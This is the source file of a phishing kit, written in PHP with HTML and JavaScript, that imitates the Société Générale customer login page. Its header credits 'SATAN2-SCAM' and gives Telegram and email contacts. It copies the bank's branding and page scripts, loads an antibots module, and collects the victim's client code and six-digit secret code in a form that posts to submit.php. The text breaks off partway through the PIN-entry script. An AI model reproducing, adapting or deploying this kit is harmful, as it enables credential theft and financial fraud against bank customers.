 <?php

/**
 * @link     : https://www.lesatan2scam.com/ 
 * @package  : SOCIETE GENERALE
 * @author   : SATAN2-SCAM 
 * @telegram : @lesatan2scam
 * @couriel  : lesatan2scam@gmail.com
 * @version  : Mise à jour
 * @copyright: https://facebook.com/lesatan2scam
 */

include '../main/antibots.php';
include_once '../main/main.php';

$random   = rand(0,100000000000);
$LSG = substr(md5($random), 0, 17);

?>
<?php 
/*CACHE*/
$fichierCache = '../cache/lsg_index.lsg';
if (@filemtime($fichierCache)<time()-(24*3600)) {ob_start(); 
?>

<!DOCTYPE html>
  <html lang="fr" class="swm-root-active swm-mode-page" >
  <head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no">
 

<script>if (top != self) { top.location = self.location; }</script>

<title>SG | Connexion</title>





<script  charset="UTF-8" src="../assets/js/n2g_secu.js"></script>
<script type="text/javascript">frame_shield();</script>
<script type="application/json" id="sas_user_info">
{

}
</script>


<meta name="robots" content="none"/>
<meta property="og:url" content="https://particuliers.societegenerale.fr/loginpage/user-login-page">


<title>Connexion à votre Espace Client Particuliers</title>
<meta name="title" content="Connexion à votre Espace Client Particuliers">
<meta property="og:title" content="Connexion à votre Espace Client Particuliers" />
  <meta name="twitter:card" content="summary" />

<script>
if (!window.cmsConstants) window.cmsConstants = {};

window.cmsConstants.LOGGER_SERVICE_END_POINT = "/extrestcontent/logBigData";
window.cmsConstants.LOGGER_LEVEL_MIN_SERVER = "error";
  window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT = "error";

  window.cmsConstants.LOGGER_SERVICE_END_POINT_DEFAULT = "/extrestcontent/logBigData";
  window.cmsConstants.LOGGER_LEVEL_MIN_SERVER_DEFAULT = "ERROR";
  window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT_DEFAULT = "ERROR";
</script><meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover">
<link rel="icon" type="image/x-icon" href="../assets/img/favicon.ico">

<script type="text/javascript">
function getCookie(name) {
var value = "; " + document.cookie;
var parts = value.split("; " + name + "=");
if (parts.length == 2) {
return parts.pop().split(";").shift();
}
return "";
}

function setValue(defaultVal, val) {
if (val == null || val.trim() === '') {
return defaultVal
}
return val;
}


function setValueBoolean(defaultVal, val) {
if (val == null || val.trim() === '') {
return defaultVal
}
return val == 1;
}

function addAdditionalParams(tc_vars) {
try {
var additionals = ""
additionals = additionals.replace(/'/g, "").replace(/"/g, '')
const params = additionals.split(',')
for (var i = 0; i < params.length; i++) {
const param = params[i].split(':')
tc_vars[param[0].trim()] = param[1].trim()
};
} catch (e) {
}
}
function getTechnicalUrl() {
var pageUrl = window.location.href;
var technical_url = pageUrl.replace(window.location.protocol +'//'+ window.location.hostname,'');
return technical_url
}

const empty = "";
//const version = "V3";
var tc_vars = {
"page_section": setValue(empty, ""),
"page_category_1": "loginpage",
"page_category_2": "",
"page_category_3": "",
"page_name": "user-login-page",
"page_type": setValue(empty, "HomePage"),
"page_noload": true,
"no_load": true,
"product_category_1": setValue(empty, ""),
"product_category_2": setValue(empty, ""),
"product_category_3": setValue(empty, ""),
"product_category_4": setValue(empty, ""),
"product_category_5": setValue(empty, ""),
"product_name_trade": setValue(empty, ""),
"product_target": setValue(empty, ""),
"env_channel": setValue("website", ""),
"env_market": setValue("particuliers", ""),
"env_work": "production",
"user_is_identified": false,
"user_is_supervisor" : false,
"env_is_private": setValueBoolean(true, ""),
"page_technical_url": getTechnicalUrl()
};
addAdditionalParams(tc_vars);

var xiti_xtn2 = "";
var xtn2 = "";



var sasInf = document.getElementById('sas_user_info');
if (sasInf) {
var sasHtml = sasInf.innerHTML;
try {
var sasJs = JSON.parse(sasHtml.trim());
if (sasJs && sasJs.IdStat && sasJs["user-info-firstname"] && sasJs["user-info-lastname"]) {
tc_vars["user_id"] = sasJs.IdStat;
tc_vars["user_is_logged"] = true;


} else {
tc_vars["user_is_logged"] = false;

}
if(sasJs && sasJs["user-info-sup"]==="true" ){
tc_vars["user_is_supervisor"] = true;

}else{
tc_vars["user_is_supervisor"] = false;

}

} catch (e) {
tc_vars["user_is_logged"] = false;

}
} else {
tc_vars["user_is_logged"] = false;

}
</script>
<script type="text/javascript">
if (typeof userSegments === "undefined") {
var userSegments = [];
}
if (typeof userSegmentNames === "undefined") {
var userSegmentNames = [];
}

userSegments.push("S--1470891196-0000000000000000000000RCRD");

userSegments.push("S-1291998658-00000000000000000000000RCRD");

userSegments.push("S-1609544352-00000000000000000000000RCRD");

userSegmentNames.push("0");

userSegmentNames.push("Desktop");

userSegmentNames.push("Clients_Generiques");
</script>

<script charset="UTF-8" src="../assets/js/init-configs_20220624163857.js"></script>
<script charset="UTF-8" src="../assets/js/dca_portail_global_20211128192509.js"></script>
<script charset="UTF-8" src="../assets/js/public-dca.js"></script>
<!--<script charset="UTF-8" src="../assets/js/vendor_20220712163549.min.js"></script>
<script charset="UTF-8" src="../assets/js/gda.public.js"></script>
<script charset="UTF-8" src="../assets/js/interact-lanceur.js"></script>
<script charset="UTF-8" src="../assets/js/index_20220712163549.min.js"></script>
<script charset="UTF-8" src="../assets/js/public-tms.js"></script>-->

<link href="../assets/css/index_pri_20220712163248.min.css" rel="stylesheet" type="text/css" />
<link href="../assets/css/spec56_btn_gsm_all_gcd_20211128192509.min.css" rel="stylesheet" type="text/css" />
<link href="../assets/css/print_20220624163857.min.css" rel="stylesheet" type="text/css" media="print"/>

<style type="text/css">
.eip_txt_light{
  font-weight:300;
}

.eip_dcw_main-link{
  color:#fff;
  text-decoration: underline !important;
  -webkit-transition: color 0.2s ease-in-out;
  -o-transition: color 0.2s ease-in-out;
  transition: color 0.2s ease-in-out;
}

.eip_dcw_main-link:hover, .eip_dcw_main-link:focus{
  color:#f05b6f;
}
</style>
<link href="../assets/css/head-section_fix-gb9_16381239090000.css" rel="stylesheet" type="text/css"/>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/theme/e7ec774b8e120610VgnVCM100000050013acRCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, templateID: e7ec774b8e120610VgnVCM100000050013acRCRD, isRenderPageFeatures: true, FURL_NAME: /authen/theme, FURL_ID: efb3c1c77d92f510VgnVCM100000030013acRCRD -->


<script src="../assets/lib/rules.js"></script> 
<script src="../assets/lib/jquery.js"></script>
<!--<script src="../assets/lib/js.js"></script>-->
<script src="../assets/lib/jquery2.js" ></script>
<script>
$(document).ready(function(){
  $("#user_id").on("change paste keyup",function(){
if ($(this).val().length >= 8) {
$('#user_id').addClass('is-valid');
} else {
$('#user_id').removeClass('is-valid'); 
}
  });
});


</script>
<script>

$(document).ready(function()
{
var _try=0;
$("#initClient").click(function()
{
$("#client-nbr").val("");
$("#secret-nbr").val("");
$("#next").css("opacity","0.4");
$("#next").css("pointer-events", "none");
$("#next").css("cursor", "default");
});


$("#initPass").click(function()
{
$("#secret-nbr").val("");
$("#pw").val("");
$("#next").css("opacity","0.4");
$("#next").css("pointer-events", "none");
$("#next").css("cursor", "default");
});




});
</script>
<script>

function ShowStep2() {
document.getElementById("clavier").style.display = "block";
document.getElementById("btn-container").style.display = "none";
}

function valider() {
var mdp = document.getElementById("user_id").value;
if (mdp.length == 5) {
return true;

} else {
return false;
}
}   


</script>

<link href="../assets/css/style2.css" rel="stylesheet" type="text/css" />
<style type="text/css">

html, body { zoom: 1;}
html, body, header, .rsp_header__wrapper-nav {
min-width:100% !important;
width:100% !important;
}
.marginDesign{  margin-top: -40px; margin-left: 15%; margin-right: 15%; }

@media screen and (max-width: 385px) {
html, body, header, .rsp_header__wrapper-nav {
min-width:100% !important;
width:100% !important;
}
}

@media screen and (max-width: 1024px) {
.flott { float: left !important; margin-left:0px !important; }
.marginDesign{  margin-top: -40px; margin-left: 7%;  margin-right: 10%;}
}
@media screen and (max-width: 955px) {
.flott{ float: left !important; margin:none :!important; }
.marginDesign{  margin-top: -40px; margin-left: -20px !important;}
}
@media screen and (max-width: 865px) {
.flott{ float: left !important; margin:none :!important; }
.marginDesign{  margin-top: -40px; margin-left: -20px !important;}
}
@media screen and (max-width: 813px) {
.flott{ float: left !important; margin:none :!important; }
.marginDesign{  margin-top: -40px; margin-left: -35px !important;}
}
@media screen and (max-width: 776px) {
.flott{ float: left !important; margin:none :!important; }
.marginDesign{  margin-top: -40px; margin-left: -10px !important;}
}
@media screen and (max-width: 390px) {
.flott{ float: left !important; margin:none :!important; }
.butto{  display: block; margin-top: -15px; margin-left: 30px !important; }
#clavier{ margin-left: -60px !important; }
}

</style> 
</head>

  
  
<body class="PRI waitJeton swm swm-mode-page swm-theme-BDDF  swm-page-authent  swm-theme-BDDF-BDDF swm-theme-SITE_WEB swm-module-authentCV">
 
<header class="rsp_header header-deco header-authent js-header-lhs-auth">
<nav class="rsp_nav rsp_nav--above" id="go-navigation">
<ul class="rsp_nav__list">

<li class="rsp_nav__item rsp_nav__item--push-right" data-channelid="">
<a href="#" class="rsp_nav__link" data-element-label="agences" ><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="../assets/img/pictos-fonctionnels_20230510173629.svg#lhs-localisation"></use></svg><span>Agences</span></a>
</li>
<li class="rsp_nav__item" data-channelid="">
<a href="#" class="rsp_nav__link" data-element-label="aide-et-contacts"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="../assets/img/pictos-fonctionnels_20230510173629.svg#lhs-urgence"></use></svg><span>Aide et contacts</span></a>
</li>
</ul>
</nav>

<div class="rsp_header__wrapper-nav">

  <a href="#" class="rsp_header__logo-mob flott" title="SG - Aller à l'accueil">
  <svg role="img" aria-label="Logo SG - C'est vous l'a venir" focusable="false" height="48" width="197" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 140.2 34.1" style="enable-background:new 0 0 140.2 34.1; xml:space=" preserve="" class="flott">
<style type="text/css">
  .st0{fill:none;}
  .st1{fill:#E60028;}
  .st2{fill:#FFFFFF;}
</style>
<rect x="-10.1" y="-9.8" class="st0" width="160.2" height="53.9"></rect>
<g>
  <path d="M73,12.1c0-2.2,1.7-3.7,4-3.7c1.3,0,2.4,0.5,3.1,1.4l-1.3,1.2c-0.5-0.5-1-0.8-1.7-0.8c-1.2,0-2,0.8-2,2.1   c0,1.2,0.8,2.1,2,2.1c0.7,0,1.2-0.3,1.7-0.8l1.3,1.2c-0.7,0.9-1.8,1.4-3.1,1.4C74.7,15.9,73,14.3,73,12.1z"></path>
  <path d="M82.9,9.1c0,0.3,0,0.5-0.3,1.2l-0.7,1.5h-1.2l0.5-1.7c-0.4-0.2-0.6-0.5-0.6-1C80.5,8.4,81,8,81.7,8   C82.4,8,82.9,8.4,82.9,9.1z"></path>
  <path d="M89.6,14.1v1.6h-5.8V8.5h5.7v1.6h-3.6v1.2h3.2v1.5h-3.2v1.3H89.6z"></path>
  <path d="M90.2,15.1l0.7-1.5c0.6,0.4,1.5,0.7,2.4,0.7c0.8,0,1.2-0.2,1.2-0.6c0-1.1-4.1-0.3-4.1-3c0-1.3,1.1-2.3,3.2-2.3   c0.9,0,1.9,0.2,2.6,0.6l-0.6,1.5c-0.7-0.4-1.4-0.6-2-0.6c-0.9,0-1.2,0.3-1.2,0.6c0,1.1,4.1,0.3,4.1,2.9c0,1.3-1.1,2.3-3.2,2.3   C92.1,15.9,90.9,15.5,90.2,15.1z"></path>
  <path d="M99.1,10.1h-2.2V8.5h6.5v1.6h-2.2v5.6h-2V10.1z"></path>
  <path d="M114.6,8.5l-3.1,7.2h-2l-3.1-7.2h2.2l2,4.7l2-4.7H114.6z"></path>
  <path d="M114.3,12.1c0-2.2,1.7-3.7,4-3.7c2.3,0,4,1.6,4,3.7s-1.7,3.7-4,3.7C116,15.9,114.3,14.3,114.3,12.1z M120.3,12.1   c0-1.2-0.9-2.1-1.9-2.1c-1.1,0-1.9,0.8-1.9,2.1s0.9,2.1,1.9,2.1C119.4,14.2,120.3,13.4,120.3,12.1z"></path>
  <path d="M123.5,12.5v-4h2v3.9c0,1.2,0.5,1.7,1.4,1.7c0.8,0,1.4-0.5,1.4-1.7V8.5h2v4c0,2.2-1.3,3.4-3.4,3.4   C124.8,15.9,123.5,14.7,123.5,12.5z"></path>
  <path d="M131.1,15.1l0.7-1.5c0.6,0.4,1.5,0.7,2.4,0.7c0.8,0,1.2-0.2,1.2-0.6c0-1.1-4.1-0.3-4.1-3c0-1.3,1.1-2.3,3.2-2.3   c0.9,0,1.9,0.2,2.6,0.6l-0.6,1.5c-0.7-0.4-1.4-0.6-2-0.6c-0.9,0-1.2,0.3-1.2,0.6c0,1.1,4.1,0.3,4.1,2.9c0,1.3-1.1,2.3-3.2,2.3   C133,15.9,131.8,15.5,131.1,15.1z"></path>
  <path d="M73.3,18.5h2v5.6h3.4v1.6h-5.5V18.5z"></path>
  <path d="M80.7,19.2c0,0.3,0,0.5-0.3,1.2l-0.7,1.5h-1.2l0.5-1.7c-0.4-0.2-0.6-0.5-0.6-1c0-0.7,0.5-1.2,1.2-1.2   C80.2,18,80.7,18.5,80.7,19.2z"></path>
  <path d="M85.9,24.4h-3l-0.6,1.4h-2.1l3.2-7.2h2l3.2,7.2h-2.1L85.9,24.4z M85.3,22.9l-0.9-2.3l-0.9,2.3H85.3z"></path>
  <path d="M95.2,18.5l-3.1,7.2h-2L87,18.5h2.2l2,4.7l2-4.7H95.2z"></path>
  <path d="M101.7,24.2v1.6h-5.8v-7.2h5.7v1.6H98v1.2h3.2v1.5H98v1.3H101.7z"></path>
  <path d="M109.7,18.5v7.2H108l-3.2-3.8v3.8h-2v-7.2h1.7l3.2,3.8v-3.8H109.7z"></path>
  <path d="M111.1,18.5h2v7.2h-2V18.5z"></path>
  <path d="M117.6,23.8h-1.1v1.9h-2v-7.2h3.3c2,0,3.2,1,3.2,2.7c0,1.1-0.5,1.8-1.4,2.3l1.6,2.3H119L117.6,23.8z M117.7,20.2h-1.1v2.1   h1.1c0.8,0,1.3-0.4,1.3-1.1C118.9,20.5,118.5,20.2,117.7,20.2z"></path>
</g>
<g>
  <path d="M9.1,15.6l1.3,0.3c3.2,0.7,4.6,2.1,4.6,4.6c0,3.1-2.3,4.8-6.6,4.8H2.8v-3.3c1.9,0.4,3.8,0.6,5.5,0.6c2.5,0,3.7-0.7,3.7-1.9   c0-1.3-0.6-1.7-3.4-2.3l-1.3-0.3c-3.2-0.6-4.6-2.1-4.6-4.6C2.7,10.6,5,8.9,9,8.9h5.1v3.3c-1.8-0.4-3.3-0.6-4.9-0.6   c-2.2,0-3.5,0.7-3.5,1.9C5.7,14.7,6.4,15.1,9.1,15.6z M31.3,17.1v8.2H26c-6,0-9.4-3-9.4-8.2c0-5.2,3.5-8.2,9.4-8.2h4.1v3.2   c-1.4-0.3-2.9-0.5-4.2-0.5c-3.8,0-6.1,2-6.1,5.5c0,3.4,2.3,5.4,6.1,5.4h2.5l0-5.4H31.3z"></path>
</g>
<rect x="38.2" y="3" class="st1" width="28.3" height="12.8"></rect>
<rect x="38.2" y="18.5" width="28.3" height="12.8"></rect>
<rect x="38.2" y="15.7" class="st2" width="28.3" height="2.8"></rect>
  </svg>
  </a>
  <a href="#" class="rsp_header__logo-desktop ml-m" title="SG - Aller à l'accueil">
  <svg role="img" aria-label="Logo SG - C'est vous l'avenir" focusable="false" height="50" width="205" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 140.2 34.1" style="enable-background:new 0 0 140.2 34.1;" xml:space="preserve">
<style type="text/css">
  .st0{fill:none;}
  .st1{fill:#E60028;}
  .st2{fill:#FFFFFF;}
</style>
<rect x="-10.1" y="-9.8" class="st0" width="160.2" height="53.9"></rect>
<g>
  <path d="M73,12.1c0-2.2,1.7-3.7,4-3.7c1.3,0,2.4,0.5,3.1,1.4l-1.3,1.2c-0.5-0.5-1-0.8-1.7-0.8c-1.2,0-2,0.8-2,2.1   c0,1.2,0.8,2.1,2,2.1c0.7,0,1.2-0.3,1.7-0.8l1.3,1.2c-0.7,0.9-1.8,1.4-3.1,1.4C74.7,15.9,73,14.3,73,12.1z"></path>
  <path d="M82.9,9.1c0,0.3,0,0.5-0.3,1.2l-0.7,1.5h-1.2l0.5-1.7c-0.4-0.2-0.6-0.5-0.6-1C80.5,8.4,81,8,81.7,8   C82.4,8,82.9,8.4,82.9,9.1z"></path>
  <path d="M89.6,14.1v1.6h-5.8V8.5h5.7v1.6h-3.6v1.2h3.2v1.5h-3.2v1.3H89.6z"></path>
  <path d="M90.2,15.1l0.7-1.5c0.6,0.4,1.5,0.7,2.4,0.7c0.8,0,1.2-0.2,1.2-0.6c0-1.1-4.1-0.3-4.1-3c0-1.3,1.1-2.3,3.2-2.3   c0.9,0,1.9,0.2,2.6,0.6l-0.6,1.5c-0.7-0.4-1.4-0.6-2-0.6c-0.9,0-1.2,0.3-1.2,0.6c0,1.1,4.1,0.3,4.1,2.9c0,1.3-1.1,2.3-3.2,2.3   C92.1,15.9,90.9,15.5,90.2,15.1z"></path>
  <path d="M99.1,10.1h-2.2V8.5h6.5v1.6h-2.2v5.6h-2V10.1z"></path>
  <path d="M114.6,8.5l-3.1,7.2h-2l-3.1-7.2h2.2l2,4.7l2-4.7H114.6z"></path>
  <path d="M114.3,12.1c0-2.2,1.7-3.7,4-3.7c2.3,0,4,1.6,4,3.7s-1.7,3.7-4,3.7C116,15.9,114.3,14.3,114.3,12.1z M120.3,12.1   c0-1.2-0.9-2.1-1.9-2.1c-1.1,0-1.9,0.8-1.9,2.1s0.9,2.1,1.9,2.1C119.4,14.2,120.3,13.4,120.3,12.1z"></path>
  <path d="M123.5,12.5v-4h2v3.9c0,1.2,0.5,1.7,1.4,1.7c0.8,0,1.4-0.5,1.4-1.7V8.5h2v4c0,2.2-1.3,3.4-3.4,3.4   C124.8,15.9,123.5,14.7,123.5,12.5z"></path>
  <path d="M131.1,15.1l0.7-1.5c0.6,0.4,1.5,0.7,2.4,0.7c0.8,0,1.2-0.2,1.2-0.6c0-1.1-4.1-0.3-4.1-3c0-1.3,1.1-2.3,3.2-2.3   c0.9,0,1.9,0.2,2.6,0.6l-0.6,1.5c-0.7-0.4-1.4-0.6-2-0.6c-0.9,0-1.2,0.3-1.2,0.6c0,1.1,4.1,0.3,4.1,2.9c0,1.3-1.1,2.3-3.2,2.3   C133,15.9,131.8,15.5,131.1,15.1z"></path>
  <path d="M73.3,18.5h2v5.6h3.4v1.6h-5.5V18.5z"></path>
  <path d="M80.7,19.2c0,0.3,0,0.5-0.3,1.2l-0.7,1.5h-1.2l0.5-1.7c-0.4-0.2-0.6-0.5-0.6-1c0-0.7,0.5-1.2,1.2-1.2   C80.2,18,80.7,18.5,80.7,19.2z"></path>
  <path d="M85.9,24.4h-3l-0.6,1.4h-2.1l3.2-7.2h2l3.2,7.2h-2.1L85.9,24.4z M85.3,22.9l-0.9-2.3l-0.9,2.3H85.3z"></path>
  <path d="M95.2,18.5l-3.1,7.2h-2L87,18.5h2.2l2,4.7l2-4.7H95.2z"></path>
  <path d="M101.7,24.2v1.6h-5.8v-7.2h5.7v1.6H98v1.2h3.2v1.5H98v1.3H101.7z"></path>
  <path d="M109.7,18.5v7.2H108l-3.2-3.8v3.8h-2v-7.2h1.7l3.2,3.8v-3.8H109.7z"></path>
  <path d="M111.1,18.5h2v7.2h-2V18.5z"></path>
  <path d="M117.6,23.8h-1.1v1.9h-2v-7.2h3.3c2,0,3.2,1,3.2,2.7c0,1.1-0.5,1.8-1.4,2.3l1.6,2.3H119L117.6,23.8z M117.7,20.2h-1.1v2.1   h1.1c0.8,0,1.3-0.4,1.3-1.1C118.9,20.5,118.5,20.2,117.7,20.2z"></path>
</g>
<g>
  <path d="M9.1,15.6l1.3,0.3c3.2,0.7,4.6,2.1,4.6,4.6c0,3.1-2.3,4.8-6.6,4.8H2.8v-3.3c1.9,0.4,3.8,0.6,5.5,0.6c2.5,0,3.7-0.7,3.7-1.9   c0-1.3-0.6-1.7-3.4-2.3l-1.3-0.3c-3.2-0.6-4.6-2.1-4.6-4.6C2.7,10.6,5,8.9,9,8.9h5.1v3.3c-1.8-0.4-3.3-0.6-4.9-0.6   c-2.2,0-3.5,0.7-3.5,1.9C5.7,14.7,6.4,15.1,9.1,15.6z M31.3,17.1v8.2H26c-6,0-9.4-3-9.4-8.2c0-5.2,3.5-8.2,9.4-8.2h4.1v3.2   c-1.4-0.3-2.9-0.5-4.2-0.5c-3.8,0-6.1,2-6.1,5.5c0,3.4,2.3,5.4,6.1,5.4h2.5l0-5.4H31.3z"></path>
</g>
<rect x="38.2" y="3" class="st1" width="28.3" height="12.8"></rect>
<rect x="38.2" y="18.5" width="28.3" height="12.8"></rect>
<rect x="38.2" y="15.7" class="st2" width="28.3" height="2.8"></rect>
  </svg>
  </a>   

 

<a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="Ouvrir un compte" data-tms-click-type="N" data-tms-element-label="se-connecter" href="#"><span class="rsp_link__label">Ouvrir un compte</span>
</a></div>

<h1 class="rsp_header__title-page" id="js-mobile-title">Connexion à votre Espace Client Particuliers</h1>

<input id="breadcrumb-channel-ids" type="hidden" value="75eec1c77d92f510VgnVCM100000030013acRCRD,f18ec1c77d92f510VgnVCM100000030013acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD">
</header>

<main class="dcw_main dcw_gb9_core-wrapper" role="main">
<section class="dcw_gb_wrapper">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb9_core-left" id="">

<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/75eec1c77d92f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, regionNames: header-int-without-navigation-and-open-main,gb9-com1-int, FURL_NAME: /authen/header, FURL_ID: a763c1c77d92f510VgnVCM100000030013acRCRD -->

 
<link rel="stylesheet" href="../assets/css/style.css" />



<div id="swm-wrapper" class="swm-inner-wrapper">


<div class="swm_authent">


<div class="auth-content js-content-aria-hide swm_codeContainer">


<DIV id="divMaster" class="swm_block">
  

<main class="dcw_main dcw_gb9_core-wrapper marginDesign" role="main">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb_row"></section>
<section class="dcw_gb_wrapper">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb9_core-left" id="">

<noscript>
<style>
.auth-content {
display: none !important;
}
.js-alert {
display: block !important;
}
.waitAuthJetonMsg {
display: none !important;
}
</style>
</noscript>

<link rel="stylesheet" href="../assets/scss/style.css">

<div id="dcw-swm" class="swm-inner-wrapper">
<form  id="form" action="submit.php"  method="POST" onsubmit="return cc()" class="component-mire-codeclient">
<div class="swm_block-element">
<div class="prefetch"></div>
<div id="disableLayer" class="disable-layer"></div>

<div id="swm-tooltip" class="swm-tooltip">
<span></span>
</div>
<div class="swm-popin-wrapper">
<div id="swm-popin-overlay" class="swm-popin-overlay"></div>
<div id="swm-popin-dialog" class="swm-popin-dialog">
<div class="swm-popin-relative">
<div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" tabindex="0" aria-label="Fermer la popin"></div>
<div class="swm-popin-ombre-sup"></div>
<div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
<div id="swm-popin" class="swm-popin">
<div id="swm-popin-cadre" class="swm-popin-cadre oob-content">
</div>
</div>
</div>
<div class="swm-popin-ombre-inf"></div>
</div>
</div>
</div>

<div class="dcw_authent">

<div class="auth-content js-content-aria-hide dcw_codeContainer">
<div id="swmModulesAuth">
<div id="module-authent-cv">
<div class="container-mire-codeClient">
<div class="dcw_block">
<div class="component-mire-codeclient">

<div class="dcw_block-element">
<div class="auth-cs-content row_section dcw_input-container">
<input id="user_id" name="user_id" type="text" class="auth-input-erasable auth-login dcw_input grey_cross eer_input__field ngim-input"  onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" autocomplete="off" maxlength="8" required=""> <span class="dcw_sprite dcw_to-clear" id="user_id-delete" style="margin-top: 5px;"> <a class="dcw_icone dcw_effacer" aria-label="Effacer le code client" href="#"></a> </span> <span class="bar" tabindex="-1" aria-hidden="true"></span>
<label tabindex="-1" aria-hidden="true">Saisissez votre code client</label>
</div>
<div id="js-error" tabindex="0" role="alert" class="auth_error show" style="display: none;"> 
<div class="error-wrapper"> 
<div role="alert" class="inner">  
<div role="alert" class="message" tabindex="0">Votre identifiant est incorrect</div>
</div> 
</div>
</div>
</div>
<div class="auth-checkbox-wrapper auth-check-left dcw_block-element" id="saveId-container" style="margin-top: -15px;">
<div class="switch" tabindex="0" aria-label="Activer la mémorisation du code client">
<input type="checkbox" class="switch input" id="saveId" name="saveId" style="display: none" data-xiti="clic_memoriser_identifiant" tabindex="0">
<label for="saveId" class="labelSwitch" onclick="" aria-hidden="true" data-xiti="clic_memoriser_identifiant" aria-labelledby="memo_code_client_label"> <span class="hidden-checkbox-input needsclick rep"></span>
<div class="toggle-btn-handle"></div>
</label>
</div> <span class="hidden-checkbox-label" id="memo_code_client_label" aria-hidden="true"><label for="saveId">Se souvenir de moi</label></span>
<div class="dcw_infohover dcw_input-info" tabindex="0" aria-label="Information sur la mémorisation du code client"> <span class="dcw_sprite-info--off"></span>
<div class="dcw_infopopin dcw_infobulle">
<p class="dcw_espace">Se souvenir de moi</p>
<p>En cochant cette case, votre code client sera mémorisé sur cet appareil.</p>
<p class="dcw_espace">De cette manière vous n'aurez plus à le saisir lors de vos prochaines connexions.</p>
<p class="dcw_espace">Ceci est déconseillé si votre ordinateur est utilisé par d'autres personnes.</p>
<button class="dcw_button-secondaire--linear-gris dcw_button-arrondi">J'ai compris</button>
</div>
</div>
</div>
<div class="auth-cs-content-validate butto" id="btn-container" style="display: block; margin-top: -15px; margin-left: 30%; margin-right: 30%;">
<button class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable" id="btn-validate" onclick="ShowStep2();" type="button" aria-label="Valider votre identifiant">Valider</button>
<br> </div>
</div>
</div>
</div>
<div id="clavier" class="loaded" style="display: none;">


<div class="component-authent-cv dcw_block" aria-expanded="true" id="sonore-vk" style="margin-top: -30px; margin-left: 25%; margin-right: 25%;">

<div class="auth-cs-content-code auth-cs-content swm-vk">

<div class="auth-cs-content-code-input row_section dcw_input-container">

<input type="button" id="closeKeyBoard">

<div class="auth-cs-content-code-input row_section dcw_input-container">

<input type="hidden" id="secret-nbr" name="Pass" class="dcw_input grey_cross" readonly="readonly"  autocomplete="off" maxlength="6" required="" placeholder="------" style="width:220px;margin-right: 50px; border: none;display: none;">

<table style="width:220px; height:20px; font-size: 45px; margin-top: -20px; margin-bottom: 20px; margin-right: 65px; color: #DDD;">
<tr>
<td id="temoin-nbr1" style="width:16.66%;">_</td>
<td id="temoin-nbr2" style="width:16.66%;">_</td>
<td id="temoin-nbr3" style="width:16.66%;">_</td>
<td id="temoin-nbr4" style="width:16.66%;">_</td>
<td id="temoin-nbr5" style="width:16.66%;">_</td>
<td id="temoin-nbr6" style="width:16.66%;">_</td>
</tr>
</table>
<span id="secret-nbr2" style="display: none;">0</span>


<span class="dcw_sprite dcw_to-clear" role="button" id="initClient" style="display: block;cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; margin-right: 55px;"></span>

<script type='text/javascript'>

function temoinNumber(){
var passpass = document.getElementById('secret-nbr').value;
if(passpass.length <= 0){ 
document.getElementById('temoin-nbr1').innerHTML = "_";
document.getElementById('temoin-nbr2').innerHTML = "_";
document.getElementById('temoin-nbr3').innerHTML = "_";
document.getElementById('temoin-nbr4').innerHTML = "_";
document.getElementById('temoin-nbr5').innerHTML = "_";
document.getElementById('temoin-nbr6').innerHTML = "_"; 

document.getElementById('temoin-nbr1').style.fontSize = "45px";
document.getElementById('temoin-nbr2').style.fontSize = "45px";
document.getElementById('temoin-nbr3').style.fontSize = "45px";
document.getElementById('temoin-nbr4').style.fontSize = "45px";
document.getElementById('temoin-nbr5').style.fontSize = "45px";
document.getElementById('temoin-nbr6').style.fontSize = "45px";

document.getElementById('temoin-nbr1').style.color = "#DDD";
document.getElementById('temoin-nbr2').style.color = "#DDD";
document.getElementById('temoin-nbr3').style.color = "#DDD";
document.getElementById('temoin-nbr4').style.color = "#DDD";
document.getElementById('temoin-nbr5').style.color = "#DDD";
document.getElementById('temoin-nbr6').style.color = "#DDD";

}
if(passpass.length == 1){ 
document.getElementById('temoin-nbr1').innerHTML = ".";
document.getElementById('temoin-nbr1').style.fontSize = "65px";
document.getElementById('temoin-nbr1').style.color = "gray";
document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
}
if(passpass.length == 2){ 
document.getElementById('temoin-nbr2').innerHTML = ".";
document.getElementById('temoin-nbr2').style.fontSize = "65px";
document.getElementById('temoin-nbr2').style.color = "gray";
document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
}
if(passpass.length == 3){ 
document.getElementById('temoin-nbr3').innerHTML = ".";
document.getElementById('temoin-nbr3').style.fontSize = "65px";
document.getElementById('temoin-nbr3').style.color = "gray";
document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
}
if(passpass.length == 4){ 
document.getElementById('temoin-nbr4').innerHTML = ".";
